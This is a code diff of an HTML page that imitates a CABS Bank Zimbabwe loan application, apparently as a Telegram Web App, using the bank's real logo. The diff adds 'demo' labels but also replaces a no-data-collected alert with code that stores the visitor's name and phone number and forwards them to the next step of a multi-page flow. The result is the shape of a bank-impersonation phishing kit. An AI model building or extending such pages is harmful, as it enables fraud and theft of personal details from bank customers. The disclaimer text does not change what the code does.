@@ -4,11 +4,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CABS Bank Zimbabwe - Loan Application Step 2</title>
+    <title>CABS Bank Zimbabwe - Loan Application Step 2 (Demo)</title>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
+        * {
+            box-sizing: border-box;
+        }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background-color: #f1f3f5;
@@ -62,17 +66,13 @@
         }
 
         .demo-notice {
-            width: 92%;
-            max-width: 450px;
-            margin-top: 15px;
-            padding: 10px;
-            background: #fff4d6;
-            border: 1px solid #e5c56b;
-            color: #765500;
-            border-radius: 8px;
+            width: 100%;
+            padding: 9px 12px;
+            background: #fff3cd;
+            color: #664d03;
             text-align: center;
             font-size: 12px;
-            box-sizing: border-box;
+            font-weight: 600;
         }
 
         .card {
@@ -83,7 +83,6 @@
             padding: 25px 20px;
             border-radius: 15px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-            box-sizing: border-box;
             display: flex;
             flex-direction: column;
         }
@@ -118,7 +117,7 @@
         }
 
         .step-bar.active {
-            background-color: #d6a629;
+            background-color: #e0a526;
         }
 
         .form-group {
@@ -141,7 +140,6 @@
             border-radius: 8px;
             background-color: #fcfcfc;
             color: #333;
-            box-sizing: border-box;
             outline: none;
             width: 100%;
         }
@@ -215,10 +213,6 @@
             text-transform: uppercase;
         }
 
-        .btn-prev:active {
-            background-color: #e2e6ea;
-        }
-
         .btn-next {
             flex: 1;
             background-color: #092c4c;
@@ -232,19 +226,14 @@
             text-transform: uppercase;
         }
 
-        .btn-next:active {
-            opacity: 0.9;
-        }
-
         .footer-banner {
             width: 100%;
             background-color: #092c4c;
-            color: rgba(255, 255, 255, 0.8);
+            color: rgba(255, 255, 255, 0.85);
             text-align: center;
             padding: 15px;
             font-size: 12px;
             margin-top: auto;
-            box-sizing: border-box;
         }
     </style>
 </head>
@@ -257,7 +246,7 @@
     <div class="header-title">
         <img
             src="https://pbs.twimg.com/profile_images/1204047964710359040/zg_xDDsa.jpg"
-            alt="CABS logo - demonstration"
+            alt="CABS Bank Zimbabwe logo"
         >
     </div>
 
@@ -265,12 +254,12 @@
 </div>
 
 <div class="demo-notice">
+    DEMONSTRATION ONLY — NOT AN OFFICIAL CABS BANK SERVICE
 </div>
 
 <div class="card">
-
     <h1 class="main-title">Loan Application</h1>
-    <div class="subtext">Step 2 of 3</div>
+    <div class="subtext">Step 2 of 3 · Demo</div>
 
     <div class="step-indicator">
         <div class="step-bar active"></div>
@@ -279,21 +268,32 @@
     </div>
 
     <form id="detailsForm" onsubmit="submitStep2(event)">
-
         <div class="form-group">
             <label for="firstName">First Name</label>
-            <input type="text" id="firstName" class="form-control"
-                   placeholder="Sample first name" autocomplete="off" required>
+            <input
+                type="text"
+                id="firstName"
+                class="form-control"
+                placeholder="First name"
+                autocomplete="given-name"
+                required
+            >
         </div>
 
         <div class="form-group">
             <label for="lastName">Last Name</label>
-            <input type="text" id="lastName" class="form-control"
-                   placeholder="Sample last name" autocomplete="off" required>
+            <input
+                type="text"
+                id="lastName"
+                class="form-control"
+                placeholder="Last name"
+                autocomplete="family-name"
+                required
+            >
         </div>
 
         <div class="form-group">
-            <label for="phone">Phone Number</label>
+            <label for="phone">Demo Contact Number</label>
 
             <div class="phone-container">
                 <div class="country-prefix">
@@ -305,14 +305,14 @@
                     type="tel"
                     id="phone"
                     class="phone-input"
-                    placeholder="Example: 771234567"
-                    autocomplete="off"
+                    placeholder="771234567"
+                    autocomplete="tel-national"
                     required
                 >
             </div>
 
             <div class="help-text">
-                Zimbabwe country code: +263.
+                Enter a sample Zimbabwean number for this demonstration.
             </div>
         </div>
 
@@ -322,37 +322,72 @@
             </button>
 
             <button type="submit" class="btn-next">
-                Continue
+                Next Step
             </button>
         </div>
-
     </form>
 </div>
 
 <div class="footer-banner">
-    © 2026 CABS Bank Zimbabwe — Official site
+    © 2026 CABS Bank Zimbabwe — Demonstration Interface
 </div>
 
 <script>
-window.onload = () => {
-    const tg = window.Telegram?.WebApp;
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
 
-    if (tg) {
-        tg.ready();
-        tg.expand();
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        const storedFirstName = localStorage.getItem('firstName');
+        const storedLastName = localStorage.getItem('lastName');
+        const storedPhone = localStorage.getItem('phone');
+
+        if (storedFirstName) {
+            document.getElementById('firstName').value = storedFirstName;
+        }
+
+        if (storedLastName) {
+            document.getElementById('lastName').value = storedLastName;
+        }
+
+        if (storedPhone) {
+            document.getElementById('phone').value = storedPhone;
+        }
+    };
+
+    function goBack() {
+        window.location.href = "/page2";
     }
-};
 
-function goBack() {
-    window.location.href = "page4.html";
-}
+    function submitStep2(event) {
+        event.preventDefault();
 
-function submitStep2(event) {
-    event.preventDefault();
+        const firstName = document.getElementById('firstName').value.trim();
+        const lastName = document.getElementById('lastName').value.trim();
 
-    // Demonstration only: no personal or banking data is collected.
-    alert("Demo completed. No information has been submitted to CABS.");
-}
+        let phoneVal = document.getElementById('phone').value.trim();
+
+        if (phoneVal.startsWith('0')) {
+            phoneVal = phoneVal.substring(1);
+        }
+
+        phoneVal = phoneVal.replace(/\D/g, '');
+
+        if (phoneVal.length !== 9) {
+            alert('Please enter a valid 9-digit demo contact number.');
+            return;
+        }
+
+        localStorage.setItem('firstName', firstName);
+        localStorage.setItem('lastName', lastName);
+        localStorage.setItem('phone', phoneVal);
+
+        // Preserve the original next-page navigation.
+        window.location.href = "/page4";
+    }
 </script>
 
 </body>
